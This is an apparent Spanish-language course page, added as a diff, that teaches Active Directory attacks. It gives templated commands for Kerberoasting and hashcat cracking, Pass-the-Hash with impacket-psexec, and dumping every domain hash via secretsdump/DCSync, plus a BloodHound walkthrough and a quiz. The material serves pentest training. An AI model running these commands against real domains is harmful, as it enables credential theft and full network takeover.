@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Lección 13: Active Directory — Ataques a entornos corporativos: Kerberos, Kerberoasting, Pass-the-Hash, Golden Ticket y BloodHound.">
+    <title>Lección 13: Active Directory — CyberPath 2026</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+        <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+    <div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
+    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
+    <main class="lesson-page">
+        <div class="lesson-breadcrumb"><a href="../index.html">Inicio</a><span>›</span><span>Fase 3</span><span>›</span><span>Lección 13</span></div>
+        <div class="lesson-hero">
+            <div class="lesson-phase-badge" style="background:rgba(255,82,82,0.15);color:#ff5252">Fase 3 — Red Team y Técnicas Avanzadas</div>
+            <h1>Active Directory — Ataques a entornos corporativos</h1>
+            <p class="lesson-intro">
+                El <strong>95% de las empresas Fortune 1000</strong> usan Active Directory para gestionar sus redes. 
+                Si quieres hacer pentesting profesional, <strong>DEBES</strong> dominar AD. En esta lección aprenderás 
+                qué es Active Directory, cómo funciona <strong>Kerberos</strong>, y los ataques más devastadores: 
+                <strong>Kerberoasting, Pass-the-Hash, Golden Ticket, DCSync</strong> y cómo usar <strong>BloodHound</strong> 
+                para mapear rutas de ataque.
+            </p>
+            <div class="concept-box" style="margin-top:1.25rem">
+                <h4>📋 Prerrequisito</h4>
+                <p>Esta lección asume que completaste la <strong><a href="leccion-13a-windows-ad-fundamentos.html" style="color:var(--accent-cyan)">Lección 13A: Fundamentos de Windows y AD</a></strong>, donde se explican dominios, usuarios, grupos, GPOs y Domain Controllers.</p>
+            </div>
+        </div>
+        <div class="lesson-toc"><h3>📋 Contenido de esta lección</h3>
+            <ol>
+                <li><a href="#que-es-ad">¿Qué es Active Directory?</a></li>
+                <li><a href="#kerberos">Kerberos: cómo funciona la autenticación</a></li>
+                <li><a href="#enumeracion">Enumeración de AD</a></li>
+                <li><a href="#kerberoasting">Kerberoasting</a></li>
+                <li><a href="#pth">Pass-the-Hash y Pass-the-Ticket</a></li>
+                <li><a href="#golden-ticket">Golden Ticket y DCSync</a></li>
+                <li><a href="#bloodhound">BloodHound: mapear rutas de ataque</a></li>
+                <li><a href="#practica">Práctica</a></li>
+            </ol>
+        </div>
+
+        <div class="lesson-section" id="que-es-ad"><h2><span class="section-icon">🏢</span> 1. ¿Qué es Active Directory?</h2>
+            <p class="lesson-text"><strong>Active Directory (AD)</strong> es el servicio de directorio de Microsoft que centraliza la gestión de usuarios, computadoras, permisos y políticas en una red corporativa. Es como la "guía telefónica" de la empresa pero mucho más poderosa.</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Concepto</th><th>Descripción</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Domain Controller (DC)</strong></td><td>El servidor que controla todo el dominio. Contiene la base de datos de AD (NTDS.dit).</td></tr>
+                    <tr><td><strong>Dominio</strong></td><td>Un grupo de recursos (users, PCs, servers) bajo una misma administración. Ej: <code>empresa.local</code></td></tr>
+                    <tr><td><strong>Usuarios</strong></td><td>Cuentas de personas o servicios. Cada una con permisos específicos.</td></tr>
+                    <tr><td><strong>Grupos</strong></td><td>Conjuntos de usuarios con permisos comunes (Domain Admins, IT Support, etc.)</td></tr>
+                    <tr><td><strong>GPO (Group Policy)</strong></td><td>Políticas que se aplican automáticamente: contraseñas, restricciones, software.</td></tr>
+                    <tr><td><strong>NTDS.dit</strong></td><td>La base de datos que contiene TODOS los hashes de contraseñas del dominio. El Santo Grial.</td></tr>
+                </tbody>
+            </table></div>
+        </div>
+
+        <div class="lesson-section" id="kerberos"><h2><span class="section-icon">🎫</span> 2. Kerberos: cómo funciona la autenticación</h2>
+            <p class="lesson-text"><strong>Kerberos</strong> es el protocolo de autenticación que usa AD. Funciona con "tickets" en lugar de enviar contraseñas por la red.</p>
+            <div class="lesson-diagram"><pre>
+    1. Usuario ──[contraseña]──▶ KDC (Domain Controller)
+       ◀── TGT (Ticket Granting Ticket) ──
+    
+    2. Usuario ──[TGT + "quiero acceder a FileServer"]──▶ KDC
+       ◀── TGS (Ticket de Servicio para FileServer) ──
+    
+    3. Usuario ──[TGS]──▶ FileServer
+       ◀── Acceso concedido ──
+            </pre><p class="diagram-caption">Flujo simplificado de Kerberos: TGT → TGS → Acceso al recurso</p></div>
+        </div>
+
+        <div class="lesson-section" id="enumeracion"><h2><span class="section-icon">🔍</span> 3. Enumeración de AD</h2>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Enumerar AD</span></div>
+                <pre><code><span style="color:#546e7a"># Enumerar usuarios del dominio</span>
+<span style="color:#00e676">$</span> crackmapexec smb DC_IP -u user -p pass --users
+<span style="color:#00e676">$</span> enum4linux -a DC_IP
+
+<span style="color:#546e7a"># Enumerar con ldapsearch</span>
+<span style="color:#00e676">$</span> ldapsearch -x -H ldap://DC_IP -b "dc=empresa,dc=local"
+
+<span style="color:#546e7a"># Enumerar SPNs (para Kerberoasting)</span>
+<span style="color:#00e676">$</span> impacket-GetUserSPNs empresa.local/user:pass -dc-ip DC_IP</code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="kerberoasting"><h2><span class="section-icon">🔥</span> 4. Kerberoasting</h2>
+            <p class="lesson-text"><strong>Kerberoasting</strong> explota cuentas de servicio con SPN: solicitas un ticket de servicio (TGS) cifrado con la contraseña del servicio, y luego lo crackeas offline.</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Kerberoasting</span></div>
+                <pre><code><span style="color:#546e7a"># Extraer tickets TGS</span>
+<span style="color:#00e676">$</span> impacket-GetUserSPNs empresa.local/user:pass -dc-ip DC_IP -request
+
+<span style="color:#546e7a"># Crackear el ticket con Hashcat</span>
+<span style="color:#00e676">$</span> hashcat -m 13100 ticket_hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="pth"><h2><span class="section-icon">🔑</span> 5. Pass-the-Hash y Pass-the-Ticket</h2>
+            <p class="lesson-text"><strong>Pass-the-Hash (PtH)</strong>: en lugar de crackear un hash NTLM, lo usas directamente para autenticarte. Windows acepta el hash como si fuera la contraseña.</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Pass-the-Hash</span></div>
+                <pre><code><span style="color:#546e7a"># Acceder con hash NTLM (sin conocer la contraseña)</span>
+<span style="color:#00e676">$</span> impacket-psexec empresa.local/admin@DC_IP -hashes :NTLM_HASH
+<span style="color:#00e676">$</span> crackmapexec smb DC_IP -u admin -H NTLM_HASH
+
+<span style="color:#546e7a"># Extraer hashes con secretsdump</span>
+<span style="color:#00e676">$</span> impacket-secretsdump empresa.local/admin:pass@DC_IP</code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="golden-ticket"><h2><span class="section-icon">🏆</span> 6. Golden Ticket y DCSync</h2>
+            <p class="lesson-text"><strong>Golden Ticket</strong>: si obtienes el hash del usuario <code>krbtgt</code>, puedes crear tickets de Kerberos para CUALQUIER usuario, incluyendo Domain Admin. Es el ataque definitivo.</p>
+            <p class="lesson-text"><strong>DCSync</strong>: simulas ser un Domain Controller y le pides al DC real que te envíe todos los hashes. Requiere privilegios de replicación.</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">DCSync</span></div>
+                <pre><code><span style="color:#546e7a"># Extraer TODOS los hashes del dominio (DCSync)</span>
+<span style="color:#00e676">$</span> impacket-secretsdump empresa.local/admin:pass@DC_IP -just-dc</code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="bloodhound"><h2><span class="section-icon">🐕</span> 7. BloodHound: mapear rutas de ataque</h2>
+            <p class="lesson-text"><strong>BloodHound</strong> analiza las relaciones de AD y visualiza rutas de ataque posibles en un grafo. Te muestra cómo escalar desde un usuario normal hasta Domain Admin.</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">BloodHound</span></div>
+                <pre><code><span style="color:#546e7a"># Recopilar datos con SharpHound</span>
+<span style="color:#00e676">$</span> bloodhound-python -u user -p pass -d empresa.local -c All -ns DC_IP
+
+<span style="color:#546e7a"># Iniciar BloodHound</span>
+<span style="color:#00e676">$</span> sudo neo4j start
+<span style="color:#00e676">$</span> bloodhound
+
+<span style="color:#546e7a"># Importar los datos .json y buscar:</span>
+<span style="color:#546e7a"># "Shortest Paths to Domain Admins"</span>
+<span style="color:#546e7a"># "Find All Kerberoastable Users"</span></code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="practica"><h2><span class="section-icon">🏋️</span> 8. Práctica</h2>
+            <div class="practice-box"><h4>✅ ¿Completaste esta lección?</h4>
+                <ul>
+                    <li>Entiendes qué es Active Directory y sus componentes</li>
+                    <li>Puedes explicar el flujo de autenticación de Kerberos</li>
+                    <li>Entiendes Kerberoasting y cómo crackear tickets TGS</li>
+                    <li>Puedes ejecutar Pass-the-Hash con Impacket</li>
+                    <li>Entiendes qué es un Golden Ticket y DCSync</li>
+                    <li>Puedes usar BloodHound para visualizar rutas de ataque</li>
+                </ul>
+            </div>
+        
+            <div class="external-labs">
+                <h4>🔗 Practica en plataformas reales</h4>
+                <ul>
+                    <li><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener noreferrer">TryHackMe: Attacking Active Directory</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                    <li><a href="https://tryhackme.com/room/activedirectorybasics" target="_blank" rel="noopener noreferrer">TryHackMe: Active Directory Basics</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                    <li><a href="https://tryhackme.com/room/postexploit" target="_blank" rel="noopener noreferrer">TryHackMe: Post-Exploitation Basics</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                </ul>
+            </div>
+
+            <div class="quiz-box" id="quiz-container"></div>
+        </div>
+
+        <div class="lesson-nav">
+            <a href="leccion-13a-windows-ad-fundamentos.html"><span class="nav-label">← Anterior</span><span class="nav-title">Lección 13A: Fundamentos de Windows y AD</span></a>
+            <a href="leccion-14-wifi-hacking.html" class="next"><span class="nav-label">Siguiente →</span><span class="nav-title">Lección 14: Hacking WiFi</span></a>
+        </div>
+    </main>
+    <footer class="footer"><div class="container"><div class="footer-content"><p style="color:var(--text-muted);font-size:0.85rem;text-align:center">CyberPath 2026 — Curso Completo de Ciberseguridad</p></div></div></footer>
+
+    <script src="../quiz.js"></script>
+    <script>
+        const quizQuestions = [
+          {
+                    "question": "¿Qué es Kerberoasting?",
+                    "options": [
+                              "Un ataque contra el protocolo SSH",
+                              "Solicitar tickets TGS de cuentas de servicio con SPN y crackearlos offline para obtener contraseñas",
+                              "Un tipo de ataque DDoS contra Domain Controllers",
+                              "Robar cookies de sesión de usuarios"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Qué es Pass-the-Hash (PtH)?",
+                    "options": [
+                              "Crackear un hash para obtener la contraseña",
+                              "Usar directamente un hash NTLM para autenticarse sin conocer la contraseña en texto plano",
+                              "Enviar hashes por correo electrónico",
+                              "Un método de cifrado de contraseñas"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Qué es un Golden Ticket en Active Directory?",
+                    "options": [
+                              "Un permiso especial del Domain Admin",
+                              "Un ticket TGT forjado usando el hash del usuario krbtgt, que da acceso ilimitado al dominio",
+                              "Una herramienta de BloodHound",
+                              "El primer usuario creado en un dominio"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Para qué sirve BloodHound?",
+                    "options": [
+                              "Para escanear puertos en la red",
+                              "Para crackear hashes de Active Directory",
+                              "Para visualizar relaciones en AD y encontrar rutas de ataque desde un usuario normal hasta Domain Admin",
+                              "Para instalar backdoors en Domain Controllers"
+                    ],
+                    "correct": 2
+          }
+];
+        window._quizQuestions = window._quizQuestions || {};
+        window._quizQuestions['leccion-13'] = quizQuestions;
+        document.addEventListener('DOMContentLoaded', () => {
+            CyberQuiz.init('leccion-13', quizQuestions);
+            const explanations = [
+                "Kerberoasting solicita tickets TGS de cuentas de servicio. Estos tickets están cifrados con la contraseña de la cuenta de servicio, que puedes crackear offline con hashcat.",
+                "Windows NTLM permite autenticarse con el hash directamente. No necesitas crackear la contraseña — el hash ES la credencial. Esto hace que robar hashes sea tan valioso como robar contraseñas.",
+                "Con el hash de krbtgt puedes forjar un TGT para CUALQUIER usuario, incluyendo Domain Admin. Es el ataque definitivo porque el ticket es legítimo desde el punto de vista de Kerberos.",
+                "BloodHound analiza las relaciones, permisos y membresías de AD en un grafo visual. Te muestra la ruta más corta desde tu usuario comprometido hasta Domain Admin."
+            ];
+            document.querySelectorAll('.quiz-question').forEach((q, i) => {
+                if (explanations[i]) q.dataset.explanation = explanations[i];
+            });
+        });
+    </script>
+</body></html>
